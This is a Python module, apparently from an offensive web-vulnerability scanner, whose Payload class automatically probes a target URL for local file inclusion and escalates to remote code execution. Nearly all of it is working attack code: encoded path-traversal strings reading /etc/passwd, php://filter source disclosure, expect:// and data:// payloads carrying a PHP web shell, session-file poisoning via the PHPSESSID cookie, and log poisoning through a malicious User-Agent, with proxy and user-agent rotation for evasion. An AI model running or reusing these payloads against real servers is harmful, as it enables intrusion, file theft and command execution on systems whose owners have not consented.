from UAList import fetchUA, fetchAgent
import re
import requests
import urllib
from urllib.parse import quote
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
from termcolor import colored
from proxies_list import fetch_proxy
from requests.auth import HTTPBasicAuth



class Payload:

	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False):
		self.url = url.strip()
		self.verbosity = verbosity
		self.outfile = outfile
		self.crawler = crawler
		self.creds = creds
		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
		# poc -> Proof Of Concept (Change it if you want)
		self.poc = poc

		# Filter
		# The quote method automatically url encodes the string except for the "."
		self.filterPaths = ["%2Fetc%2Fpasswd", quote("index"), quote("index.php"), quote("index.html")]
		self.filterBase = quote("php://filter/read=convert.base64-encode/resource=")

		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
		self.phpHeaders = [quote("expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"]

		# PHPSESSID Cooki
		self.cookiePath = "/var/lib/php/sessions/sess_"

		# payload for RCE
		self.payload = "<?php system($_GET['cmd']); ?>"

		self.proxies = proxies
		if initiate:
			self.Attack()




	def Attack(self):
		if self.urlCheck():
			self.dirTraversalCheck()
			self.headerCheck()
			self.filterCheck()
			self.cookieCheck()
			self.logPoisonCheck()




	# It sends the url as is without decoding it first, so that it can bypass filters that look for ..
	def hit(self, url):
		if self.proxies:
			proxy_support = urllib.request.ProxyHandler(fetch_proxy())
			opener = urllib.request.build_opener(proxy_support)
			urllib.request.install_opener(opener)
		try:
			if self.creds is not None:
				response = self.cred(url)
			else:
				response = requests.get(url, verify=False)
			response = str(response.content)
			return self.stripHtmlTags(response)
		
		except HTTPError as e:
    			print(colored('[-]', 'red', attrs=['bold']) + ' Error code: ', e.code)		
		except URLError as e:
   			 print(colored('[-]', 'red', attrs=['bold']) + ' Reason: ', e.reason)




	# Checks if the url is valid
	def urlCheck(self):
		try:
			print("Checking Remote Server Health")
			if self.proxies:
				ret = requests.get(self.url, headers=fetchUA(), proxies=fetch_proxy())
			elif self.creds is not None:
				ret = self.cred(self.url)
			else:
				ret = requests.get(self.url, headers=fetchUA())
			if ret.status_code == 200:
				print(colored(str(ret.status_code) +" - OK",'green'))
				return True
			else:
				print(colored(str(ret.status_code) + " - DEAD", 'red'))
				return False	
		except Exception as e:
			print(colored(str(ret.status_code) + " - DEAD", 'red'))
			print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
			print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
			return False




	def cred(self, url):
		list_creds = self.creds.split(':')
		user = list_creds[0]
		passwd = list_creds[1]
		ret = requests.get(url, headers=fetchUA(), verify=False, auth=HTTPBasicAuth(user, passwd))
		return(ret)

			


			
	# Strips all HTML tags from the HTTP response	
	def stripHtmlTags(self, t):
		htmlchars = re.compile('<.*?>')
		clean = re.sub(htmlchars, '', t)
		return clean




	# Checks for directory traversal
	def dirTraversalCheck(self):
		for i in self.linux_dirTraversal:
			for n in self.poc:
				compUrl = self.url + i + n
				if self.verbosity > 1:
					print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
				clean = self.hit(compUrl)
				if 'root:x' in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
					if self.outfile is not None:
						self.outfile.write('[+] Directory traversal found with ' + compUrl + '\n')
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')




	# Checks for Remote Code Execution with php headers
	def headerCheck(self):
		for header in self.phpHeaders:
			compUrl = self.url + header
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
			clean = self.hit(compUrl)
			if 'uid=' in clean.lower():
				print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
				if self.outfile is not None:
					self.outfile.write('[+] Remote code execution (RCE) found with ' + compUrl + '\n')
			else:
				if self.verbosity > 0:
					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')

	
	
	
	# Checks if it can retrieve files with the php filter	
	def filterCheck(self):
		for path in self.filterPaths:
			compUrl = self.url + self.filterBase + path
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
			clean = self.hit(compUrl)
			words = clean.split()
			if len(words) > 0:
				for word in words:
					if word.endswith('='):
						print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
						if self.outfile is not None:
							self.outfile.write('[+] Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
					else:
						if self.verbosity > 0:
							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
			else:
				if self.verbosity > 0:
					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')




	# Checks if the PHPSESSID cookie can be exploited
	def cookieCheck(self):
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: PHPSESSID cookie injection')
		s = requests.Session()
		session = s.get(self.url, headers=fetchUA())
		cookies = session.cookies.get_dict()
		for cookie in cookies:
			if 'phpsessid' in cookie.lower():
				# it gets the value of the cookie
				value = session.cookies[cookie]
				#send the payload to see if there is RCE
				newUrl = self.url + self.payload
				s.get(newUrl, headers=fetchUA())
				# open the file to find if the command worked
				compUrl = self.url + self.cookiePath + value + "&cmd=id"
				clean = self.hit(compUrl)	
				if 'uid='  in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned')
					if self.outfile is not None:
						self.outfile.write('[+] Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned\n')
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')




	def logPoisonCheck(self):
		headerss = {"User-Agent": self.payload}
		response = requests.get(self.url, headers=headerss)
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
		# checks the type of the server
		if "apache" in response.headers['Server'].lower():
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
			# Apache logs
			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ"), quote("/var/log/auth.log")]
			for d_path in self.linux_dirTraversal:
				for l_path in logPath:
					pathth = self.url + d_path + l_path
					compUrl = pathth + "&cmd=id"
					clean = self.hit(compUrl)
					if "uid=" in clean.lower():
						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)
						if self.outfile is not None:
							self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathth + '\n')
					else:
						if self.verbosity > 0:
							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		

		elif "nginx" in response.headers['Server'].lower():
			# Nginx logs
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
			for d_path in self.linux_dirTraversal:
				for l_path in log:
					pathh = self.url + d_path + l_path
					compUrl = pathh + "&cmd=id"
					clean = self.hit(compUrl)
					if "uid=" in clean.lower():
						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
						if self.outfile is not None:
							self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathh + '\n')
					else:
						if self.verbosity > 0:
							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
		else:
			print(colored('[-]', 'red', attrs=['bold']) + " The server type " + url.getheader('Server') + " is not supported!!!")

